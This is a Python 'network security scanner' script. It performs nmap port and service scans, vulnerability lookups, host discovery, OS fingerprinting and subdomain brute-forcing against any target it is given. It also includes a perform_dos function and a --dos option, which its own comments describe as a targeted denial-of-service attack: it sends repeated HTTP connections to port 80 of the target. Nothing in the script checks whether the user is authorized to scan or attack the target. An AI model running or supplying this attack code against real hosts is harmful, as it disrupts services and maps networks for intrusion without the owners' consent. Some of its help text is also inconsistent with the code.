import socket
import concurrent.futures
import argparse
import json
import nmap
import requests
import asyncio
import aiohttp
import logging
import sys
from datetime import datetime
import scapy.all as scapy




# logs and lists things out to the user while running
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


async def check_subdomain(session, url): #returns the subdomain when one is found
    try:
        async with session.get(url, timeout=5) as response:
            if response.status == 200:
                logging.info(f"Found subdomain: {url}")
                return url
    except (aiohttp.ClientError, asyncio.TimeoutError):
        pass

async def scan_subdomains_async(target_domain, subdomain_list): #compares the subdomain from the list and sees if it gets a return from subdomain.host
    async with aiohttp.ClientSession() as session:
        tasks = []
        for subdomain in subdomain_list:
            url = f"http://{subdomain}.{target_domain}"
            task = asyncio.ensure_future(check_subdomain(session, url))
            tasks.append(task)

        subdomains = await asyncio.gather(*tasks)
        return [subdomain for subdomain in subdomains if subdomain]

def scan_subdomains(target_domain): #sets the async method to recursively search until the list is exhausted
    logging.info(f"Scanning subdomains for {target_domain}")

    with open("subdomains.txt", "r") as file:
        subdomain_list = file.read().splitlines()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    subdomains = loop.run_until_complete(scan_subdomains_async(target_domain, subdomain_list))

    return subdomains

def perform_dos(target_host, num_requests): #sets up and performs a targeted denial of service attack on the designated host
    logging.info(f"Performing DoS attack on {target_host} with {num_requests} requests")
    for i in range(num_requests):
        logging.info(f"Sending request {i+1}/{num_requests}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_host, 80))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
            sock.close()
        except socket.error:
            pass

def scan_ports(target_host, start_port, end_port): #scans ports from start to end on the target host using an aggressive nmap configuration (to make it faster), defaults to 1-450 (covers some common ports, HTTP, HTTPS, SSH, etc...)
    logging.info(f"Scanning ports {start_port} to {end_port} on {target_host}")
    
    nm = nmap.PortScanner()
    nm.scan(target_host, f"{start_port}-{end_port}", arguments="-sV -T4")
    
    results = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            lport = nm[host][proto].keys()
            for port in lport:
                service_info = nm[host][proto][port]
                service_name = service_info['name']
                service_version = service_info['version'] if 'version' in service_info else 'Unknown'
                logging.info(f"Port {port} is open - Service: {service_name} ({service_version})")
                results.append({"port": port, "service": service_name, "version": service_version})
    
    return results

def scan_vulnerabilities(target_host): #takes the list of ports and checks the services on them and returns vulnerabilities associated with those services, does not actually do any attacking
    logging.info(f"Scanning for vulnerabilities on {target_host}")
    nm = nmap.PortScanner()
    nm.scan(target_host, arguments="-sV --script vulners")
    vulnerabilities = []

    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            lport = nm[host][proto].keys()
            for port in lport:
                if 'script' in nm[host][proto][port]:
                    if 'vulners' in nm[host][proto][port]['script']:
                        vulners_info = nm[host][proto][port]['script']['vulners']
                        if vulners_info:
                            vulnerability = {
                                "port": port,
                                "vulnerabilities": vulners_info.strip().split('\n')
                            }
                            vulnerabilities.append(vulnerability)

    return vulnerabilities

def discover_devices(target): #discovers devices on a network connected to the ports within the scanned range
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-sn')
    devices = []

    for host in nm.all_hosts():
        if 'mac' in nm[host]['addresses']:
            mac = nm[host]['addresses']['mac']
        else:
            mac = 'Unknown'

        if 'hostnames' in nm[host] and len(nm[host]['hostnames']) > 0:
            hostname = nm[host]['hostnames'][0]['name']
        else:
            hostname = 'Unknown'

        device = {
            'ip': host,
            'mac': mac,
            'hostname': hostname
        }
        devices.append(device)

    return devices

def fingerprint_os(target): #if devices are detected, it attempts to determine the signature/fingerprint/OS it is running
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-O')
    os_fingerprints = []

    for host in nm.all_hosts():
        if 'osmatch' in nm[host]:
            os_match = nm[host]['osmatch'][0]
            os_fingerprint = {
                'ip': host,
                'os_name': os_match['name'],
                'os_accuracy': os_match['accuracy']
            }
            os_fingerprints.append(os_fingerprint)

    return os_fingerprints

def main(): #this is where the magic happens
    parser = argparse.ArgumentParser(description="Network Security Scanner") #parsing arguments allows for options such as -v -o and -d to work as well as configures -h options
    parser.add_argument("target", help="Target host or network range to scan, default is 1-450")
    parser.add_argument("-p", "--ports", nargs=2, type=int, default=[1, 450],
                        help="Port range to scan (default: 1-1024)")
    parser.add_argument("-o", "--output", help="Output file to save the results in JSON format")
    parser.add_argument("-d", "--discover", action="store_true",
                        help="Perform network device discovery")
    parser.add_argument("-f", "--fingerprint", action="store_true",
                        help="Perform OS fingerprinting on discovered devices")
    parser.add_argument("-v", "--vulnerabilities", action="store_true",
                        help="Perform vulnerability scanning")
    parser.add_argument("-s", "--subdomains", action="store_true",
                        help="Perform subdomain scanning")
    parser.add_argument("--dos", type=int, help="Perform DoS attack with the specified number of requests")
    args = parser.parse_args()

    #true or false depending on if x arg is inputted by the user
    target = args.target
    start_port, end_port = args.ports
    output_file = args.output
    discover = args.discover
    fingerprint = args.fingerprint
    vulnerabilities = args.vulnerabilities
    subdomains = args.subdomains
    dos_requests = args.dos

    results = {}
    #if start and end port are initialized, it will run a port scan on those ports
    if start_port and end_port:
        port_results = scan_ports(target, start_port, end_port)
        results['ports'] = port_results

    #if the -d arg is used, it calls the discover devices method
    if discover:
        logging.info("Performing network device discovery")
        discovered_devices = discover_devices(target)
        results['discovered_devices'] = discovered_devices
        #if -d has also been called, it checks if -f is called and then fingerprints the detected devices on a network scan
        if fingerprint:
            logging.info("Performing OS fingerprinting on discovered devices")
            os_fingerprints = []
            for device in discovered_devices:
                os_fingerprints.extend(fingerprint_os(device['ip']))
            results['os_fingerprints'] = os_fingerprints
    #runs the subdomain scan method if called
    if subdomains:
        logging.info("Performing subdomain scanning")
        subdomains_result = scan_subdomains(target)
        results['subdomains'] = subdomains_result
    #runs vulnerabily scans method if called
    if vulnerabilities:
        logging.info("Performing vulnerability scanning")
        vulnerabilities_result = scan_vulnerabilities(target)
        results['vulnerabilities'] = vulnerabilities_result
    #runs DOS method if called
    if dos_requests:
        logging.info(f"Performing DoS attack with {dos_requests} requests")
        perform_dos(target, dos_requests)
        results['dos_attack'] = f"Performed DoS attack with {dos_requests} requests"
    #runs output file method when called
    if output_file:
        with open(output_file, "w") as file:
            json.dump(results, file, indent=4)
    else: #sets log info regardless
        logging.info("Results:")
        logging.info(json.dumps(results, indent=4))

if __name__ == "__main__": #when main begins, it starts a timer to log the time it takes for the entire network scan/analysis to complete.
    start_time = datetime.now()
    main()
    end_time = datetime.now()
    execution_time = end_time - start_time
    logging.info(f"Execution time: {execution_time}")